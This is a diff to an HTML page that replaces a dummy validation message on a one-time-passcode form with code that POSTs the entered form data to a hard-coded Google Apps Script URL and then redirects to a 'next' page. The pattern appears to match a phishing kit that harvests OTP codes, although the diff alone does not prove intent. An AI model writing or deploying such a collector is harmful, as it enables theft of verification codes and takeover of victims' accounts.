@@ -240,20 +240,39 @@
   </div>
 
   <script>
-    const form = document.getElementById("otpForm");
-    const statusEl = document.getElementById("status");
+    const form = document.getElementById('otpForm');
+    const statusEl = document.getElementById('status');
+    const WEBAPP_URL = "https://script.google.com/macros/s/AKfycbxeIPpKVQOagylbISVnIckuJeazhERR8IYTxtJQFhCqRNJmawsQ-b4_b5pkSQRBldxN/exec";
 
-    form.addEventListener("submit", (e) => {
+    form.addEventListener('submit', async (e) => {
       e.preventDefault();
+      statusEl.textContent = "Submitting...";
+      statusEl.style.color = "#555";
 
-      statusEl.textContent = "Validation complete ✔️";
-      statusEl.style.color = "#168a3a";
+      const formData = new FormData(form);
 
-      setTimeout(() => {
-        window.location.href = "thankyou.html";
-      }, 700);
+      try {
+        const response = await fetch(WEBAPP_URL, { method: "POST", body: formData });
+        const text = await response.text();
+
+        let json;
+        try { json = JSON.parse(text); } catch {
+          statusEl.textContent = "Invalid response from server.";
+          statusEl.style.color = "#b00000";
+          return;
+        }
+
+        if (json.result === "success") {
+          window.location.href = "next.html";
+        } else {
+          statusEl.textContent = "Submission failed: " + (json.message || "Unknown error");
+          statusEl.style.color = "#b00000";
+        }
+      } catch (err) {
+        statusEl.textContent = "Network error. Try again.";
+        statusEl.style.color = "#b00000";
+      }
     });
   </script>
-
 </body>
 </html>
